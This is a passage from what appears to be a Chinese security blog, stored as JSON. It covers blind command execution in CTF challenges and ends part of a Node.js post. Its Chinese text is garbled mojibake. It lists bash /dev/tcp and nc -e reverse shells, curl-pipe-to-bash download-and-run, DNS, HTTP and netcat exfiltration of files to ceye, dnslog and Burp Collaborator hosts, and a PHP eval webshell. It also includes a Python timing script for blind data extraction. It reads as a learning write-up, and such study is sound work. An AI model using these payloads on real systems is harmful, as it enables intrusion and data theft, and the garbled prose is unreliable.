ä¸­è¿è¡Œå‘½ä»¤ï¼Œå®Œæˆåå°† stdout å’Œ stderr ä¼ ç»™å›è°ƒå‡½æ•°ã€‚ child_process.execFile (): ä¸ child_process.exec () ç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„åœ¨äºï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒç›´æ¥è¡ç”Ÿå‘½ä»¤ï¼Œè€Œä¸å…ˆè¡ç”Ÿ shellã€‚ child_process.fork (): è¡ç”Ÿæ–°çš„ Node.js è¿›ç¨‹å¹¶ä½¿ç”¨å»ºç«‹çš„ IPC é€šä¿¡é€šé“ï¼ˆå…¶å…è®¸åœ¨çˆ¶å­è¿›ç¨‹ä¹‹é—´å‘é€æ¶ˆæ¯ï¼‰è°ƒç”¨æŒ‡å®šçš„æ¨¡å—ã€‚ child_process.execSync (): child_process.exec () çš„åŒæ­¥ç‰ˆæœ¬ï¼Œå…¶å°†é˜»å¡ Node.js äº‹ä»¶å¾ªç¯ã€‚ child_process.execFileSync (): child_process.execFile () çš„åŒæ­¥ç‰ˆæœ¬ï¼Œå…¶å°†é˜»å¡ Node.js äº‹ä»¶å¾ªç¯ã€‚ åŒæ­¥è¿›ç¨‹çš„åˆ›å»º child_process.spawnSync ()ã€child_process.execSync () å’Œ child_process.execFileSync () æ–¹æ³•æ˜¯åŒæ­¥çš„ï¼Œå°†é˜»å¡ Node.js äº‹ä»¶å¾ªç¯ï¼Œ æš‚åœä»»ä½•å…¶ä»–ä»£ç çš„æ‰§è¡Œï¼Œç›´åˆ°è¡ç”Ÿçš„è¿›ç¨‹é€€å‡ºã€‚ å…·ä½“çš„ç»†èŠ‚å¤§å®¶å¯ä»¥å»å®˜æ–¹æ–‡æ¡£çœ‹çœ‹ 0x08 å‚è€ƒæ–‡ç«  æ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡» â€“pç¥ JavaScript åŸå‹é“¾æ±¡æŸ“ Node.js å¸¸è§æ¼æ´å­¦ä¹ ä¸æ€»ç»“ NodeJS VMå’ŒVM2æ²™ç®±é€ƒé€¸ Node.jså¸¸è§æ¼æ´å­¦ä¹ ä¸æ€»ç»“ NodeJsä»é›¶åˆ°åŸå‹é“¾æ±¡æŸ“","categories":["å¸¸è§topæ¼æ´"]},{"title":"æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ","path":"/2023/10/28/wu-hui-xian-ming-ling-zhi-xing/","content":"0x01 å‰è¨€ æ²¡é”™ï¼Œæœ¬ç¯‡ä¹Ÿæ˜¯åœ¨CTFä¸‹é‡åˆ°æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œä¹‹åæ¥è¿›è¡Œçš„å­¦ä¹ ï¼Œä¸è¿‡ç½‘ä¸Šæ‰¾äº†å¾ˆå¤šæ–‡ç« æ„Ÿè§‰æ²¡ä¸€ä¸ªæ»¡æ„çš„ï¼Œåªèƒ½ä¸œæ‹¼è¥¿å‡‘äº†ã€‚ æ¥ä¸‹æ¥å°±å¼€å§‹å­¦ä¹ ä¹‹æ—…ï¼š åœ¨æ¸—é€æµ‹è¯•ã€æ¼æ´æŒ–æ˜æˆ–å®‰å…¨ç ”ç©¶çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¼šé‡åˆ°å¾ˆå¤šæ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œç‚¹ã€‚é¢å¯¹è¿™äº›æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œç‚¹ï¼Œæˆ‘ä»¬å¾ˆéš¾è·å–å‘½ä»¤æ‰§è¡Œç»“æœï¼Œç”šè‡³æ— æ³•åˆ¤æ–­å‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚æœ¬ç¯‡æ–‡ç« ä¸»è¦è®¨è®ºé¢å¯¹è¿™äº›æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œç‚¹æ—¶çš„åˆ¤æ–­å’Œåˆ©ç”¨æ–¹æ³•ã€‚ 0x02 æ— å›æ˜¾åˆ¤æ–­ é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“è¯¥ç‚¹æ˜¯å¦å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæˆ–è€…æˆ‘ä»¬çš„å‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸäº†ã€‚è¿™é‡Œçš„ç ”åˆ¤æ–¹æ³•æœ‰å¾ˆå¤šç§ï¼Œæœ€å¸¸ç”¨çš„æ˜¯ç›´æ¥é€šè¿‡å»¶æ—¶åˆ¤æ–­ï¼Œç±»ä¼¼æˆ‘ä»¬sqlæ³¨å…¥é‡Œçš„æ—¶é—´ç›²æ³¨ï¼š cmd=sleep 5 ç±»ä¼¼ä¼¼çš„å‡½æ•°è¿˜æœ‰benchmark(count,expr) å’Œgetlockï¼ˆstrï¼Œtimeï¼‰ã€‚ å€¼å¾—ä¸€æçš„æ˜¯ï¼Œwindowsä¸‹å¹¶æ²¡æœ‰sleepå‘½ä»¤ï¼Œé‚£ä¹ˆå¦‚ä½•é€šè¿‡æ—¶é—´å»¶æ—¶çš„æ–¹å¼åˆ¤æ–­windowsç¯å¢ƒä¸‹çš„å‘½ä»¤æ‰§è¡Œå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡å›ç¯pingæ¥è¾¾åˆ°å¼ºåˆ¶å»¶æ—¶çš„æ•ˆæœï¼š ping -n 3 127.0.0.1 ping -n 4 127.0.0.1 Linuxä¸‹åŒæ ·è¯•ç”¨ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡pingå‘½ä»¤åœ¨ä¸åŒç¯å¢ƒä¸‹çš„æ‰§è¡Œæ–¹å¼æ¥åˆ¤æ–­ç›®æ ‡çš„æ“ä½œç³»ç»Ÿç±»å‹ï¼š ping -c 3 127.0.0.1 ping -c 4 127.0.0.1 è¿™é‡Œå€Ÿç”¨å‚è€ƒæ–‡ç« çš„å›¾ç‰‡äº† å»¶æ—¶åˆ¤æ–­æ³•æ˜¯åœ¨æ— å›æ˜¾æƒ…å†µä¸‹æœ€ç®€å•çš„åˆ¤æ–­æ–¹å¼ï¼Œä¼˜ç‚¹æ˜¯èƒ½åˆ†è¾¨æ“ä½œç³»ç»Ÿã€æ— è®ºç›®æ ‡æ˜¯å¦å‡ºç½‘éƒ½èƒ½åˆ¤æ–­ï¼Œç¼ºç‚¹æ˜¯åªèƒ½åˆ¤æ–­ä¸èƒ½åˆ©ç”¨ã€‚ 0x03 CTFåœºæ™¯ åœ¨ctfä¸­ï¼Œæœ‰æ—¶ä¼šé‡åˆ°æ— å›æ˜¾rceï¼Œå°±æ˜¯è¯´è™½ç„¶å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä½†å´çœ‹ä¸åˆ°å‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼Œä¹Ÿä¸çŸ¥é“å‘½ä»¤æ˜¯å¦è¢«æ‰§è¡Œã€‚ æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š &lt;?php highlight_file(__FILE__); $a=$_GET['a']; exec(\"$a\"); //$b=exec(\"$a\"); //echo $b; ?&gt; å‘½ä»¤æ‰§è¡Œå‡½æ•°æˆ‘ç”¨çš„æ˜¯exec,å› ä¸ºè¿™ä¸ªå‡½æ•°æœ¬èº«æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œæ‹¿æ¥åšæµ‹è¯•ç®€ç›´ä¸èƒ½å†åˆé€‚ã€‚ å¦‚ä¸Šå›¾æˆ‘ä»¬æ‰§è¡Œä¹‹åå‘ç°é¡µé¢å¹¶æ²¡æœ‰å›æ˜¾æ•°æ®ï¼Œæˆ‘ä»¬é¦–å…ˆç”¨sleepå‘½ä»¤çœ‹çœ‹å‘½ä»¤æ˜¯å¦è¢«æˆåŠŸæ‰§è¡Œäº†ï¼Œçœ‹ä¸‹å›¾å®ƒè½¬äº†äº”ç§’ä¹‹åæ‰æ¢å¤è¯´æ˜å‘½ä»¤æ˜¯æ‰§è¡Œäº†çš„ï¼š 0x04 ç»•è¿‡æ–¹æ³• 4.1 åå¼¹shell é‡åˆ°è¿™ç§æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œï¼Œå¾ˆå¸¸è§çš„ä¸€ä¸ªæ€è·¯æ˜¯åå¼¹shellï¼Œå› ä¸ºå®ƒè™½ç„¶ä¸ä¼šå°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœè¾“å‡ºåœ¨å±å¹•ä¸Šï¼Œä½†å®é™…ä¸Šè¿™ä¸ªå‘½ä»¤å®ƒæ˜¯æ‰§è¡Œäº†çš„ï¼Œé‚£æˆ‘ä»¬å°±å°†shellåå¼¹åˆ°è‡ªå·±æœåŠ¡å™¨ä¸Šï¼Œç„¶åå†æ‰§è¡Œå‘½ä»¤è‚¯å®šå°±å¯ä»¥çœ‹åˆ°å›æ˜¾äº† ä¸€èˆ¬æ¥è®²æˆ‘ä»¬åå¼¹shelléƒ½ç”¨çš„bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1è¿™æ¡å‘½ä»¤ã€‚â€“è¿™é‡Œå‘¢æˆ‘å¤ç°ä¸€ç›´ä¸æˆåŠŸï¼Œä¼°è®¡å°±æ˜¯ç¯å¢ƒé…ç½®é—®é¢˜ï¼Œå› æ­¤è¿™é‡Œè¿˜æ˜¯å­¦ä¸ªæ€è·¯å§ï¼Œä¸æƒ³æ­ç¯å¢ƒè´¹æ—¶é—´äº†ã€‚ã€‚ã€‚ payloadï¼š bash -i &gt;&amp; /dev/tcp/192.168.17.137/5555 0&gt;&amp;1 /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.17.137/5555 0&gt;&amp;1' //ä½¿ç”¨æŒ‡å®šçš„bash shellåå¼¹ nc -e /bin/sh ip port å¯ä»¥çœ‹åˆ°ä»–è¿™é‡Œå·²ç»åå¼¹æˆåŠŸâ€“ä½†æˆ‘ä¸çŸ¥é“ä¸ºä½•å¤ç°ä¸æˆåŠŸâ”­â”®ï¹â”­â”® tipï¼šä¹Ÿå¯ä»¥å°†å‘½ä»¤å†™å…¥æ–‡ä»¶ï¼Œä¹‹ååœ¨å­˜åœ¨å‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹è¾“å…¥curl ip|bashå³å¯åå¼¹ æ”»å‡»è€…ä¹Ÿå¯ä»¥å¯åŠ¨httpæœåŠ¡ï¼Œå¹¶åœ¨ç«™ç‚¹ç›®å½•ä¸‹å­˜æ”¾ä¸€ä¸ªæ–‡ä»¶ï¼Œé‡Œé¢å†™ç€bashåå¼¹shellå‘½ä»¤ ?a=curl%20http://192.168.10.128/bashshell|bash æˆåŠŸåå¼¹åˆ°shell 4.2 DNSå¤–å¸¦ å‘èµ·ä¸€ä¸ªdnsè¯·æ±‚éœ€è¦é€šè¿‡linuxä¸­çš„pingå‘½ä»¤æˆ–è€…curlå‘½ä»¤ ç„¶åè¿™é‡Œæ¨èä¸€ä¸ªdnslogçš„åˆ©ç”¨å¹³å°ï¼šceye http://ceye.io/ï¼Œæ³¨å†Œè´¦å·ä¹‹åï¼Œä¼šç»™ä¸€ä¸ªåŸŸåï¼Œå½“å‘èµ·çš„è¯·æ±‚ä¸­å«æœ‰è¿™ä¸ªåŸŸåæ—¶ï¼Œå¹³å°å°±ä¼šæœ‰è®°å½•ã€‚è¿™é‡Œä¹Ÿå¯ä»¥åˆ©ç”¨dnslogå¹³å° payloadå¦‚ä¸‹ï¼š cmd=curl `å‘½ä»¤`.åŸŸ curl `ls`.78c59j.ceye.io å¦‚ä¸Šå›¾å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸä»¤æ•°æ®å›æ˜¾è‡³ceyeå¹³å°ä¸Šå» é‚£ä¹ˆä¸ºäº†è®©å®ƒæ˜¾ç¤ºå‡ºå‰©ä½™çš„ç»“æœï¼Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°linuxçš„sedå‘½ä»¤ï¼Œç”¨sedå‘½ä»¤å°±å¯ä»¥å®ç°å¯¹è¡Œçš„å®Œç¾åˆ’åˆ†ã€‚ curl ls | sed -n â€˜1pâ€™.78c59j.ceye.io ç»“åˆä¸Šé¢ä¸¤ä¸ªå›¾ç‰‡å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥éå†å›æ˜¾å‡ºæ‰€æœ‰ç›®å½•ä¸‹çš„æ–‡ä»¶ ä½†æ˜¯å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå› ä¸ºæœ‰çš„å­—ç¬¦å¯èƒ½ä¼šæ— æ³•æ˜¾ç¤ºæˆ–è€…åªæ˜¾ç¤ºéƒ¨åˆ†ä¿¡æ¯ï¼Œæ‰€ä»¥è¯´æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™æ¨èä½¿ç”¨base64ç¼–ç ï¼Œç„¶åå†è§£å¼€å°±å¥½ï¼š 1;curl `cat 1.txt | base64`.78c59j.ceye.io 1;curl `ls | base64`.78c59j.ceye.io/ ä¸è¿‡ç¼ºç‚¹å¾ˆæ˜æ˜¾ï¼Œä¼¼ä¹æ‰¾ä¸åˆ°ä¸€ä¸ªæ–¹æ³•å¯ä»¥è®©å›æ˜¾å†…å®¹å®Œå…¨ï¼Œå¹¶ä¸”æˆ‘çš„cat 1.txtè¿™æ¡å‘½ä»¤ä¸çŸ¥ä¸ºä½•æ‰§è¡Œä¸äº†ã€‚ æ³¨æ„ï¼š 1ï¼‰å‘½ä»¤æ‰§è¡Œæ—¶è¦é¿å…ç©ºæ ¼ï¼Œç©ºæ ¼ä¼šå¯¼è‡´ç©ºæ ¼åé¢çš„å‘½ä»¤æ‰§è¡Œä¸åˆ°ï¼› 2ï¼‰å°†è¯»å–çš„æ–‡ä»¶å‘½ä»¤ç”¨åå¼•å·``åŒ…å«èµ·æ¥ï¼› 3ï¼‰æ‹¼æ¥çš„åŸŸåæœ‰é•¿åº¦é™åˆ¶ã€‚ ä¸¾ä¸ªä¾‹å­ï¼š #ç”¨&lt;æ›¿æ¢è¯»å–æ–‡ä»¶ä¸­çš„ç©ºæ ¼ï¼Œä¸”å¯¹è¾“å‡ºç»“æœbase64ç¼–ç ï¼Œç„¶åæ‹¼æ¥åŸŸå curl `cat&lt;flag.php|base64`.cf1gbs.dnslog.cn #å¦ä¸€ç§æ–¹æ³• curl `cat flag.php|sed s/[[:space:]]//`.cf1gbs.dnslog.cn 4.3 httpè¯·æ±‚ é¶æœºé€šè¿‡å‘VPSå‘èµ·HTTPè¯·æ±‚ï¼ŒVPSç›‘å¬åˆ°è¯·æ±‚åˆ™ä»£è¡¨å‘½ä»¤æ‰§è¡ŒæˆåŠŸ(æ³¨æ„ï¼špingå‘½ä»¤ä¸äº§ç”Ÿhttpè¯·æ±‚) VPSï¼šnc -lvp 8888 é¶æœºï¼šcmd=curl ip:8888 è¿™é‡Œå¤ç°ä¸€ç›´ä¸æˆåŠŸï¼Œæ‰¾äº†å‡ ç¯‡æ–‡ç« å‘ç°ï¼š ç›®æ ‡æœåŠ¡å™¨å‘ä¸ªäººçš„å…¬ç½‘æœåŠ¡å™¨å‘èµ·httpè¯·æ±‚ï¼Œå½“è¯¥å…¬ç½‘æœåŠ¡å™¨æ”¶åˆ°httpè¯·æ±‚å°±ä»£è¡¨å‘½ä»¤æœ‰æ‰§è¡Œã€‚ ä¸¾ä¸ªä¾‹å­æï¼š ä¸ªäººçš„å…¬ç½‘æœåŠ¡å™¨ä½¿ç”¨ nc -lvp 7777 å¼€å§‹ç›‘å¬ï¼› ç›®æ ‡æœåŠ¡å™¨ä½¿ç”¨ curl å…¬ç½‘æœºipï¼šç«¯å£å·ã€‚ å¯ä»¥çœ‹åˆ°å…¬ç½‘æœåŠ¡å™¨çš„è¯¥ç«¯å£æœ‰httpè¯·æ±‚ã€‚ï¼ˆæ³¨ï¼špingå‘½ä»¤ä¸äº§ç”Ÿhttpè¯·æ±‚ï¼‰ ä¼°è®¡è¿™é‡Œä¸æˆåŠŸçš„åŸå› åœ¨äºæˆ‘ä½¿ç”¨çš„kaliä¸”kaliæ²¡å‡ºç½‘ä¾æ—§å¤„äºå†…ç½‘ã€‚æ­£å¸¸çš„è¯åº”è¯¥æ˜¯ä¸‹å›¾ï¼š 4.4 æ‰§è¡Œå‘½ä»¤ï¼ˆéœ€è¦ç«™ç‚¹ç›®å½•å…·æœ‰å†™æƒé™ï¼‰ åˆ©ç”¨cpå‘½ä»¤ï¼šcp flag.php 1.txt åˆ©ç”¨mvå‘½ä»¤ï¼šmv flag.php 1.txt åˆ©ç”¨&gt;è¾“å‡ºç»“æœåˆ°æ–‡ä»¶ï¼šls &gt; 1.txt åˆ©ç”¨wgetä¸‹è½½ï¼šwget http://ip/shell.txt &gt; shell.phpæˆ–è€…wget http://ip/shell.txt -O shell.php åˆ©ç”¨tar tar cvf flag.tar flag.php # æ‰“åŒ…flag.phpä¸ºflag.tar tar zcvf flag.tar.gz flag.php # å‹ç¼©flag.phpä¸ºflag.tar.gz # è§£å‹ç¼©ï¼štar zxvf flag.tar.gz åˆ©ç”¨zip zip flag.zip flag.php #è§£å‹ç¼©ï¼šunzip flag.zip è¿™é‡Œçœ‹ä¸€ä¸ªç½‘ä¸Šä¾‹å­ï¼ˆå¤ç°ä¸å¥½æ‰¾ã€‚ã€‚ã€‚ egï¼šé€šè¿‡å‘½ä»¤æ‰§è¡Œç›´æ¥å¾—åˆ°æ–‡ä»¶å†…å®¹ å°†cp where_is_flag.php 1.txtåšä¸ºå‚æ•°ä¼ é€’ç»™pingï¼Œç„¶åå°±æ‰§è¡Œäº†cp where_is_flag.php 1.txtè¿™ä¸ªå‘½ä»¤ï¼Œç”Ÿæˆ1.txtæ–‡ä»¶ï¼Œåœ¨å»è®¿é—®1.txtï¼Œå°±èƒ½å¾—åˆ°1.txtçš„å†…å®¹ï¼ˆä¹Ÿå°±æ˜¯where_is_flag.phpçš„å†…å®¹ï¼‰ï¼Œæœ€åæ‰¾åˆ°flag 4.5 ç›´æ¥å†™å…¥æˆ–å¤–éƒ¨ä¸‹è½½webshell ç›´æ¥å†™å…¥ï¼ˆéœ€è¦ç«™ç‚¹ç›®å½•å…·æœ‰å†™æƒé™ï¼‰ echo \"&lt;?php @eval(\\$_POST[123]); ?&gt;\" &gt; webshell.php å¤–éƒ¨ä¸‹è½½ï¼ˆç›®æ ‡æœåŠ¡å™¨å¯ä»¥è¿æ¥å¤–ç½‘æˆ–å¯ä»¥ä¸æ”»å‡»æœºäº’é€šï¼Œä¸”èƒ½æ‰§è¡Œwgetå‘½ä»¤ï¼‰ wget æ”»å‡»æœºip -O webshell.php #ä½¿ç”¨wgetä¸‹è½½shellï¼Œä½¿ç”¨å‚æ•°-Oæ¥æŒ‡å®šä¸€ä¸ªæ–‡ä»¶å 4.6 ncå¤–å¸¦ é¶æœºï¼šnc ip 8888 &lt; flag.php VPSï¼šnc -lvp 8888 å½“tcpä¸èƒ½ä½¿ç”¨ï¼Œ-uå‚æ•°è°ƒæ•´ä¸ºudp é¶æœºï¼šnc -u ip 8888 &lt; flag.php VPSï¼šnc -ulvp 8888 4.7 httpå¤–å¸¦ çœ‹åˆ°ä¸€ç¯‡æ–‡ç« æ¨èçš„httpä¿¡é“ ?cmd=curl http://ç»™å®šçš„URL /?1=`ls /` æ³¨æ„å¦‚æœè¦ç¼–ç çš„è¯,è¦åŠ ä¸ª . ?cmd=curl http://ç»™å®šçš„URL /?1=`ls .|base64` ä¸Šå›¾çº¢è‰²æ ‡æ³¨çš„åœ°æ–¹å°±æ˜¯base64åŠ å¯†çš„ç»“æœï¼Œæˆ‘ä»¬è§£å¯†çœ‹åˆ°ä¸‹å›¾ï¼Œå¯ä»¥çœ‹åˆ°å›æ˜¾çš„æ•°æ®å¾ˆå¤šï¼Œä¼¼ä¹è¿™æ˜¯ä¸ªä¼˜ç‚¹ 4.8 åœ¨vpsä¸Šå»ºç«‹è®°å½•è„šæœ¬ å½“ç›®æ ‡æœåŠ¡å™¨å¯ä»¥å‘å…¬ç½‘æœåŠ¡å™¨å‘èµ·httpè¯·æ±‚ï¼Œå¹¶ä¸”èƒ½æ‰§è¡Œcurlå‘½ä»¤æˆ–wgetå‘½ä»¤ 1ï¼‰åœ¨ä¸ªäººå…¬ç½‘æœåŠ¡å™¨çš„æ ¹ç›®å½•æ„é€ ä¸€ä¸ªè®°å½•è„šæœ¬ï¼š7.php ã€‚ #7.php &lt;?php header(\"Content-type:text/html; charest=utf-8\"); highlight_file(_FILE_); include(\"flag.php\"); $ip=$_REQUEST['ip']; if($ip) { shell_exec(\"ping -c 4\".$ip); } ?&gt; 2ï¼‰åœ¨ç›®æ ‡æœåŠ¡å™¨çš„æµ‹è¯•ç‚¹å‘é€ä»»æ„ä¸€æ¡è¯·æ±‚è¿›è¡Œæµ‹è¯•ï¼Œå°†è·å¾—çš„flagè¿›è¡Œbase64è§£ç å³å¯ã€‚ curl http://*.*.*.**/7.php?data=`cat flag.php|base64` wget http://*.*.*.*/7.php?data=`cat flag.php|base64` ä¸è¿‡è¿™é‡Œæ²¡çœ‹æ‡‚ï¼Œä¹Ÿæ²¡å¤ç°æˆåŠŸã€‚ã€‚ã€‚ã€‚ 4.9 burp(Collaborator Client) ä½¿ç”¨ curl -F å°†flagæ–‡ä»¶ä¸Šä¼ åˆ°Burpçš„Collaborator Clientã€‚è¿™æ˜¯ä¸€ä¸ªç±»ä¼¼httpslog+dnslogçš„æ’ä»¶ï¼Œå…¶åŠŸèƒ½æ¯”dnslogå¼ºå¤§ï¼Œå¯ä»¥ä¸ç”¨æ­å»ºä»»ä½•ç¯å¢ƒå»ç›‘å¬dnså’Œhttpè¯·æ±‚ï¼Œä¹Ÿå¯ä»¥å¾ˆæ–¹ä¾¿çš„æŸ¥çœ‹postè¯·æ±‚åŒ…å’Œcookieç­‰ã€‚ è·å–Collaborator Clientåˆ†é…ç»™BURPçš„é“¾æ¥ï¼š æ‰“å¼€Burpä¸»ç•Œé¢ --&gt;èœå•ï¼ˆBurpï¼‰â€“&gt;Burp Collaboraor Client â€“ &gt; ç‚¹å‡» Copy to Clipboard --æ­¤å¤„ä¼¼ä¹æ˜¯ä½ç‰ˆæœ¬çš„æ­¥éª¤ å¦‚ä¸Šå›¾ï¼Œæˆ‘è¿™é‡Œæ˜¯2023ç‰ˆæœ¬çš„ï¼Œç›´æ¥å°±é›†æˆäº†ã€‚ é¶æœºï¼šæ‹¼æ¥payloadå¹¶åœ¨å‘½ä»¤æ‰§è¡Œå¤„æäº¤å³å¯æŸ¥çœ‹Collaborator Clientæ”¶åˆ°çš„æ•°æ®ã€‚ cmd=curl -X POST -F xx=@flag.php http://jj6xpgxristzkbn1fpkl32t6jxpndc.burpcollaborator.net cmd=1;curl `whoami`.nlcfzmusx6w63w922oozpq59c0ir6iu7.oastify.com 0x05 pyè„šæœ¬ï¼ˆè¿›é˜¶ï¼‰ ä¸Šè¿°0x04è®²å¾—éƒ½æ˜¯åˆ©ç”¨ç°æœ‰å·¥å…·è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯è¿›é˜¶çš„CTFé¢˜ç›®ä¼¼ä¹éƒ½è¦æ±‚ä½ æœ‰ç¼–å†™pyè„šæœ¬çš„èƒ½åŠ›å»è¿›è¡Œç›²æ³¨ã€‚è¿™é‡Œä¹Ÿæ˜¯æœ‰å¹¸æ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« å¯¹æ­¤çš„åˆ†æï¼Œè™½ç„¶è„šæœ¬ä¸ä¼šå†™ï¼Œä½†æˆ‘å…ˆç«‹å¿—çœ‹æ‡‚ä»–ã€‚ å‡è®¾æœåŠ¡å™¨ä¸å‡ºç½‘å¹¶ä¸”webç›®å½•ä¸å¯å†™ Linuxå¯ä»¥ç”¨ç±»ä¼¼ç›²æ³¨çš„æ–¹å¼å¾—åˆ°å›æ˜¾ï¼Œè¿™æ¬¡ä¸»è¦å†™ä¸‹Windowsçš„ï¼Œå…¶å®ä¹Ÿå·®ä¸å¤š è¿™é‡Œçš„æƒ…å†µå°±ä¸æˆ‘åšçš„CTFé¢˜ç›®ä¸€æ ·ã€‚ 5.1 Linux æ–¹æ³•å’Œå»¶æ—¶æ³¨å…¥å·®ä¸å¤šï¼Œæˆªå–å‘½ä»¤å›æ˜¾ç»“æœå¾ªç¯è¿›è¡Œå¯¹æ¯”ï¼Œå¯¹æ¯”åˆ°äº†å°±ç”¨sleepå»¶æ—¶ é¦–å…ˆè¦äº†è§£linux ifè¯­å¥ if [ command ];then ç¬¦åˆæ¡ä»¶æ‰§è¡Œçš„è¯­å¥ elif [ command ];then ç¬¦åˆæ¡ä»¶æ‰§è¡Œçš„è¯­å¥ else ä¸Šé¢éƒ½ä¸ç¬¦åˆæ‰§è¡Œçš„è¯­å¥ fi è¿™æ¬¡åªéœ€è¦ç”¨åˆ°ä¸€ä¸ªåˆ¤æ–­æ‰€ä»¥ä¸ç”¨è¿™ä¹ˆå¤æ‚ if [ 1 = 1 ];then sleep 2;fi #è¿™é‡Œçš„1=1æ¡ä»¶æˆç«‹å°±ä¼šæ‰§è¡Œä¸‹é¢çš„sleep 2è¯­å¥ if [ `whoami|cut -c 1` = 'r' ];then sleep 2;fi #å–å‡ºwhoamiç¬¬ä¸€ä¸ªå­—ç¬¦å¯¹æ¯”æ˜¯å¦ä¸ºrï¼Œæ˜¯råˆ™sleep2ç§’ Linuxä¸‹åå¼•å·æ˜¯å‘½ä»¤æ›¿æ¢ï¼Œä¸€èˆ¬æ¥è¯´æ˜¯å°†æ‰§è¡Œè·å¾—çš„ç»“æœå†æ‰§è¡Œä¸€æ¬¡ï¼Œè¿™é‡Œå¯ä»¥ç†è§£ä¸ºå°†å‘½ä»¤çš„ç»“æœä¿å­˜ä¸‹æ¥åä¸ç­‰å·åé¢çš„å­—ç¬¦å¯¹æ¯” cut å‘½ä»¤æ˜¯åˆ‡å‰²å­—ç¬¦ä¸²ï¼Œwhoami|cut -c 1å°±æ˜¯å¾—åˆ°å‘½ä»¤ç»“æœçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œä»¥æ­¤ç±»æ¨ åœ¨ä¸€äº›å›æ˜¾ä¸­å¯èƒ½ä¼šå‡ºç°å¾ˆå¤šç¬¦å·ï¼Œè¿˜æœ‰ä¸­æ–‡ä»€ä¹ˆçš„ï¼Œä¸ºäº†é¿å…å›æ˜¾ç»“æœä¸å‡†ç¡®çš„æƒ…å†µå¯ä»¥é€šè¿‡base32ç¼–ç åå†æ‰§è¡Œcutæ“ä½œ if [ `whoami|base32|cut -c 1` = 'r' ];then sleep 2;fi è¿™é‡Œä½¿ç”¨base32çš„åŸå› æ˜¯base32åªæœ‰å¤§å†™å­—æ¯å’Œ2-7å’Œ=ï¼Œå‡å°‘äº†çˆ†ç ´å­—ç¬¦æ•°é‡ï¼Œæé«˜äº†å›æ˜¾ç»“æœçš„ç²¾å‡†åº¦ ä¸‹é¢ç”¨pythonå†™ä¸ªè„šæœ¬ import requests import string #str_zf åŒ…å«å¤§å†™å­—æ¯å’Œæ•°å­—å­—ç¬¦ä»¥åŠç­‰å·å­—ç¬¦ã€‚è¿™äº›å­—ç¬¦å°†ç”¨äºæ„å»ºæ³¨å…¥è´Ÿè½½ã€‚ str_zf = string.ascii_uppercase + \"234567=\" #cmd å˜é‡åŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œè€Œ url å˜é‡åŒ…å«ç›®æ ‡URLï¼Œå…¶ä¸­å°†åŒ…å«æ³¨å…¥çš„å‘½ä»¤ã€‚ cmd = \"pwd\" url = \"http://10.130.4.204:8081/index.php?cmd=\" def get_result(cmd ,url): result = \"\" for i in range(1, 65535): for s in str_zf: #payload æ˜¯ä¸€ä¸ªåŒ…å«å‘½ä»¤æ³¨å…¥çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼Œå¦‚æœ i æ˜¯1ï¼Œs æ˜¯ 'A'ï¼Œé‚£ä¹ˆ payload å°†æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç”¨äºæ£€æŸ¥å‘½ä»¤è¾“å‡ºçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ç­‰äº 'A'ã€‚ payload = \"if [ `{}|base32|cut -c {}` = '{}' ];then sleep 5;fi\".format(cmd, i, s) url_payload = url + payload response = requests.get(url_payload) #å‘é€HTTP GETè¯·æ±‚åˆ° url_payloadï¼Œå¹¶è®°å½•å“åº”çš„æ—¶é—´ã€‚ time = response.elapsed.total_seconds() #å¦‚æœå“åº”æ—¶é—´å¤§äº3ç§’ï¼ˆå‡è®¾å‘½ä»¤è¾“å‡ºçš„å­—ç¬¦ä¸ s åŒ¹é…ï¼‰ï¼Œåˆ™å°† s æ·»åŠ åˆ° result ä¸­ã€‚ if time &gt; 3: result += s print(result) break if __name__ == '__main__': get_result(cmd, url) string.ascii_uppercase æ˜¯ Python æ ‡å‡†åº“ä¸­ string æ¨¡å—ä¸­çš„ä¸€ä¸ªå¸¸é‡ï¼Œå®ƒåŒ…å«äº†è‹±æ–‡å­—æ¯çš„å¤§å†™ç‰ˆæœ¬ï¼Œå³ A åˆ° Z çš„ 26 ä¸ªå­—ç¬¦ã€‚å…·ä½“æ¥è¯´ï¼Œstring.ascii_uppercase åŒ…å«ä»¥ä¸‹å­—ç¬¦ï¼š ABCDEFGHIJKLMNOPQRSTUVWXYZ 